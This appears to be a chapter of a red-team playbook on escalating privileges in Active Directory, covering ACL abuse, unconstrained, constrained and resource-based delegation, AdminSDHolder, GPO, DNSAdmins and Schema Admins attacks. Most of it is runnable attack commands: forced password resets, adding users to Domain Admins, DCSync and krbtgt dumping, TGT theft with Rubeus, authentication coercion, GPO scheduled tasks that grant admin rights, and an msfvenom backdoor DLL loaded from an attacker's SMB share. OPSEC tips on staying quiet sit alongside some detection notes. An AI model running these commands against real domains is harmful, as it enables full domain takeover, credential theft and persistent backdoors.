# Phase 6: Privilege Escalation in AD

> Going from "I have a user" to "I have Domain Admin" via ACL misconfigurations and delegation.

---

## Table of Contents
1. [ACL Abuse Overview](#1-acl-abuse-overview)
2. [Common ACL Attack Recipes](#2-common-acl-attack-recipes)
3. [Unconstrained Delegation](#3-unconstrained-delegation)
4. [Constrained Delegation](#4-constrained-delegation)
5. [Resource-Based Constrained Delegation (RBCD)](#5-resource-based-constrained-delegation-rbcd)
6. [AdminSDHolder](#6-adminsdholder)
7. [GPO Abuse](#7-gpo-abuse)

---

## 1. ACL Abuse Overview

ACL abuse is **the** advanced AD attack surface. BloodHound is the discovery tool — every edge in BloodHound's graph (`GenericAll`, `WriteDACL`, `AddMember`, etc.) is an ACL misconfiguration you can chain.

### Rights cheat sheet

| Right | Abuse → |
|-------|---------|
| `GenericAll` | Full control — pick any abuse below |
| `GenericWrite` | Write any attribute. Target user: set SPN → Kerberoast. Target computer: set RBCD |
| `WriteDACL` | Modify the object's ACL — grant yourself GenericAll. On domain object → grant DCSync |
| `WriteOwner` | Become owner → grant yourself GenericAll |
| `AllExtendedRights` on user | Reset their password |
| `User-Force-Change-Password` | Reset user password without knowing old one |
| `AddMember` on group | Add yourself to the group |
| `WriteProperty` on `msDS-AllowedToActOnBehalfOfOtherIdentity` (computer) | RBCD attack |
| `DS-Replication-Get-Changes` + `-All` on domain | DCSync |
| `WriteProperty` on `msDS-KeyCredentialLink` (user/computer) | Shadow credentials (PKINIT auth) |

---

## 2. Common ACL Attack Recipes

### Force change a user's password
```powershell
# PowerView
$pw = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $pw
```
```bash
# Linux — net rpc
net rpc password targetuser 'NewPass123!' -U 'lab.local/jdoe%Password1' -S 10.10.10.10

# Impacket changepasswd
changepasswd.py lab.local/jdoe:'Password1'@10.10.10.10 -newpass 'NewPass123!' -altuser targetuser
```

🔴 **OPSEC**: Resetting a real user's password lets them know something's wrong on next logon. Use rarely or only on service accounts.

### Add yourself to a group
```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members jdoe
```
```bash
net rpc group addmem 'Domain Admins' jdoe -U 'lab.local/jdoe%Password1' -S 10.10.10.10
```

### Targeted Kerberoasting (you have GenericWrite on a user)
```powershell
# Write an SPN to a user that has no SPN, then Kerberoast them
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/krb_attack'}
Get-DomainSPNTicket targetuser | Format-List
Set-DomainObject -Identity targetuser -Clear serviceprincipalname    # cleanup
```

### Grant yourself DCSync via WriteDACL on domain
```powershell
# Add the two replication rights to jdoe on the domain object
Add-DomainObjectACL -TargetIdentity "DC=lab,DC=local" -PrincipalIdentity jdoe \
  -Rights DCSync -Verbose
# Then:
secretsdump.py lab.local/jdoe:Password1@10.10.10.10
```
```bash
# Linux — Impacket dacledit
python3 dacledit.py -action write -rights DCSync -principal jdoe \
  -target-dn "DC=lab,DC=local" -dc-ip 10.10.10.10 'lab.local/compromised:Pass'
```

### WriteOwner → take ownership → grant yourself rights
```powershell
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity jdoe
Add-DomainObjectACL -TargetIdentity 'Domain Admins' -PrincipalIdentity jdoe -Rights All
Add-DomainGroupMember -Identity 'Domain Admins' -Members jdoe
```

### Shadow Credentials (write to msDS-KeyCredentialLink)
**Concept**: Inject a fake "public key" into the target's `msDS-KeyCredentialLink`. You then authenticate as them via Kerberos PKINIT (cert-based) → get their NTLM hash without resetting their password.

```bash
# Certipy (all-in-one)
certipy shadow auto -u jdoe@lab.local -p Password1 -account 'WS01$' -dc-ip 10.10.10.10
# Output: NTLM hash of WS01$ machine account
```
```powershell
# Whisker (Windows)
.\Whisker.exe add /target:targetuser
# Outputs Rubeus command to use the injected key
```

🟢 **OPSEC**: Stealthier than password reset — the user can still log in normally. Detection requires monitoring writes to `msDS-KeyCredentialLink` (Event 5136 with attribute audit).

---

## 3. Unconstrained Delegation

**Concept**: A computer or user with this flag receives the TGT of every user who authenticates to it. Compromise that host → wait for a privileged user to connect (or coerce one) → steal their TGT → impersonate.

### Find unconstrained delegation
```powershell
Get-DomainComputer -Unconstrained | select name, dnshostname
# DCs ALWAYS have unconstrained — look for NON-DCs in the result.
```

### Exploit — wait + steal
```powershell
# On the unconstrained machine (as local admin)
.\Rubeus.exe monitor /interval:5 /filteruser:administrator
# Captures TGT base64 every 5 seconds for the target user

# Or grab everything in memory now
.\Rubeus.exe dump /nowrap
```

### Force the auth (coercion)
```bash
# Coerce a DC to authenticate to your unconstrained box
# Once it does, its TGT is captured → DCSync
python3 printerbug.py 'lab.local/jdoe:Password1@dc01.lab.local' unconstrained.lab.local

# Or PetitPotam, DFSCoerce — see 04-credential-attacks.md
```

Inject the captured DC TGT and DCSync:
```powershell
.\Rubeus.exe ptt /ticket:<DC_TGT_base64>
mimikatz.exe "lsadump::dcsync /user:krbtgt" exit
```

🔴 **OPSEC**: Coercion is loud. Monitor mode itself is just memory reads — quiet unless EDR fingerprints Rubeus.

---

## 4. Constrained Delegation

**Concept**: Account with `msDS-AllowedToDelegateTo` populated can request service tickets to listed services *as any user* (via S4U2Self → S4U2Proxy).

### Find constrained delegation accounts
```powershell
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto
```

### Exploit — abuse the trust
```bash
# Impacket getST — impersonate admin to the allowed service
getST.py -spn cifs/dc01.lab.local -impersonate administrator \
  'lab.local/svc_web:Password1' -dc-ip 10.10.10.10

export KRB5CCNAME=administrator@cifs_dc01.lab.local.ccache
secretsdump.py -k -no-pass dc01.lab.local
```

```powershell
# Rubeus (Windows)
.\Rubeus.exe s4u /user:svc_web /rc4:<NTLMhash> /impersonateuser:administrator \
  /msdsspn:cifs/dc01.lab.local /ptt /domain:lab.local
```

**Gotcha — "Protocol Transition" vs "Constrained Delegation"**: Without protocol transition (`TrustedToAuthForDelegation = false`), you can only delegate tickets that were obtained via Kerberos in the first place. With it (`true`), you can impersonate anyone. Most exploitable scenarios assume the flag is on.

### Bonus: SPN swap (any SPN, not just listed)
The TGS returned by S4U2Proxy has an SPN field. Many services don't validate it strictly, so you can edit the ticket's SPN with Rubeus `/altservice:ldap` to pivot to a service that wasn't in the allowed list.

---

## 5. Resource-Based Constrained Delegation (RBCD)

**Concept**: The *target* computer controls who can delegate **to** it, via `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you have `GenericAll`/`GenericWrite`/`WriteProperty` on a computer object, you can write to that attribute and impersonate anyone to that computer.

This is the most useful and exploited delegation attack in modern AD.

### Steps
```bash
# Step 1: You need a controlled computer account. Either:
#   (a) You compromised one's hash already, or
#   (b) Create one — by default any domain user can create up to 10 (ms-DS-MachineAccountQuota = 10)
addcomputer.py -computer-name 'PWN$' -computer-pass 'PwnPass123!' \
  'lab.local/jdoe:Password1' -dc-ip 10.10.10.10

# Step 2: Write RBCD attribute on target — allow PWN$ to delegate to WS01$
rbcd.py -action write -delegate-from 'PWN$' -delegate-to 'WS01$' \
  -dc-ip 10.10.10.10 'lab.local/jdoe:Password1'

# Step 3: Use PWN$ to request a TGS as administrator on WS01
getST.py -spn cifs/ws01.lab.local -impersonate administrator \
  'lab.local/PWN$:PwnPass123!' -dc-ip 10.10.10.10

# Step 4: Use the ticket
export KRB5CCNAME=administrator@cifs_ws01.lab.local.ccache
psexec.py -k -no-pass ws01.lab.local
```

```powershell
# Windows equivalent — PowerView + Rubeus
New-MachineAccount -MachineAccount PWN -Password (ConvertTo-SecureString 'PwnPass123!' -AsPlainText -Force)
# Set RBCD
$pwnSid = (Get-DomainComputer PWN).objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor \
  -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($pwnSid))"
$bytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($bytes, 0)
Set-DomainObject WS01 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$bytes}
# Request TGS
.\Rubeus.exe s4u /user:PWN$ /rc4:<PWN_NTLM> /impersonateuser:administrator \
  /msdsspn:cifs/ws01.lab.local /ptt
```

🟡 **OPSEC**: Creating a computer account = Event 4741. Writing to `msDS-AllowedToActOnBehalfOfOtherIdentity` = Event 5136 (directory-service change). Defender for Identity has a "Suspicious additions to sensitive groups" / "Suspicious resource-based constrained delegation" rule.

**Check `ms-DS-MachineAccountQuota` first** — orgs increasingly set it to 0 specifically to block RBCD self-pivot.
```bash
nxc ldap 10.10.10.10 -u jdoe -p Password1 -M maq
```

---

## 6. AdminSDHolder

**Concept**: `AdminSDHolder` is a special AD container. Every 60 minutes the SDProp process copies its ACL onto all "protected" objects (Domain Admins, Enterprise Admins, krbtgt, etc.). If you can write to AdminSDHolder's ACL, you persistently grant yourself rights on all protected objects.

```powershell
# Add jdoe with GenericAll to AdminSDHolder
Add-DomainObjectACL -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=lab,DC=local' \
  -PrincipalIdentity jdoe -Rights All -Verbose

# Wait up to 60 min for SDProp to propagate
# Then jdoe has GenericAll on every protected group/user → add self to DA
```

🔴 **OPSEC**: Loud — directly modifies the most-monitored ACL in AD. Used more for **persistence** than initial escalation. Detected by any decent EDR baseline.

---

## 7. GPO Abuse

**Concept**: A GPO applied to a target OU runs commands on every host/user in that OU. If you have write rights to a GPO that applies to (say) the "Workstations" OU, you can drop a scheduled task or startup script there → SYSTEM execution on all those workstations.

### Find GPOs you have write access to
```powershell
Get-DomainGPO | Get-DomainObjectACL -ResolveGUIDs |
  ? {$_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" `
     -and $_.IdentityReferenceName -match "jdoe"}
```

### Add a malicious scheduled task (SharpGPOAbuse)
```powershell
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Patch" --Author lab\administrator \
  --Command "cmd.exe" --Arguments "/c net localgroup administrators jdoe /add" \
  --GPOName "Workstation Policy"

# Force immediate refresh on target
Invoke-GPUpdate -Computer ws01 -Force
```

### Linux variant — pyGPOAbuse
```bash
python3 pygpoabuse.py 'lab.local/jdoe:Password1' \
  -gpo-id "{31B2F340-016D-11D2-945F-00C04FB984F9}" \
  -command 'net localgroup administrators jdoe /add' \
  -dc-ip 10.10.10.10
```

🔴 **OPSEC**: GPO modifications generate 4670 (permissions change) and 5136 (attribute write). Many orgs alert on GPO changes outright.

---

## Next Step

You've escalated to DA or have a path → **Phase 7: Domain Dominance** (`07-domain-dominance.md`)
Want to keep access long-term → **Phase 8: Persistence** (`08-persistence.md`)
Need to evade EDR while doing this → **Phase 11: Evasion** (`11-evasion.md`)

---

## 8. DNSAdmin Abuse

**Concept**: Members of the `DnsAdmins` group can configure the DNS server to load an arbitrary DLL via `dnscmd`. Since DNS runs as SYSTEM on the DC, this gives you SYSTEM on the DC — equivalent to DA.

```bash
# Check if you're in DnsAdmins
Get-DomainGroupMember "DnsAdmins"
nxc ldap 10.10.10.10 -u jdoe -p Password1 -M groupmembership -o GROUP="DnsAdmins"

# Step 1: Create a malicious DLL (msfvenom or custom)
msfvenom -p windows/x64/exec CMD='net user hacker P@ss /add && net localgroup administrators hacker /add' \
  -f dll -o evil.dll

# Step 2: Host on SMB share (or use existing accessible share)
smbserver.py share . -smb2support

# Step 3: Configure DNS to load the DLL
dnscmd dc01.lab.local /config /serverlevelplugindll \\10.10.10.99\share\evil.dll

# Step 4: Restart the DNS service (DnsAdmins can do this)
sc.exe \\dc01.lab.local stop dns
sc.exe \\dc01.lab.local start dns
# DLL loads as SYSTEM on the DC → command runs → local admin/SYSTEM

# Cleanup: remove the DLL plugin
dnscmd dc01.lab.local /config /serverlevelplugindll ""
```

🔴 **OPSEC**: DNS service restart generates Event 7036 on the DC. DLL load from UNC path is extremely suspicious — Sysmon Event 7 (Image load) from dns.exe with non-standard path. Nearly all EDRs flag this.

**Detection**:
- Event 7036 (Service Control Manager) — DNS service stop/start
- Sysmon Event 7 — DLL load by dns.exe from non-system path
- Registry modification: `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll`
- Defender for Identity has direct coverage

---

## 9. Schema Admins Abuse

**Concept**: Schema Admins can modify the AD schema — the definition of all object classes and attributes. While rarely directly exploitable for a quick DA path, it enables persistent backdoors that are nearly impossible to fully clean up.

```powershell
# Who is in Schema Admins? (should be empty in well-managed domains)
Get-DomainGroupMember "Schema Admins"

# Common schema abuse: add a new attribute to user objects that gets replicated everywhere
# Or: add yourself to Schema Admins if you have WriteDACL on the group
Set-DomainObjectOwner -Identity "Schema Admins" -OwnerIdentity jdoe
Add-DomainObjectACL -TargetIdentity "Schema Admins" -PrincipalIdentity jdoe -Rights All
Add-DomainGroupMember -Identity "Schema Admins" -Members jdoe
```

**More practical abuse — adding a backdoor attribute**:
```powershell
# If you're Schema Admin, you can modify the schema to store hidden data
# e.g., add an attribute that holds a secret, then write arbitrary values to any object
# This is complex and rarely needed in a pentest — flag it as critical risk and move on
```

**Reporting note**: If you find any non-Microsoft, non-expected accounts in Schema Admins, that is a **Critical** finding on its own — even without exploitation.

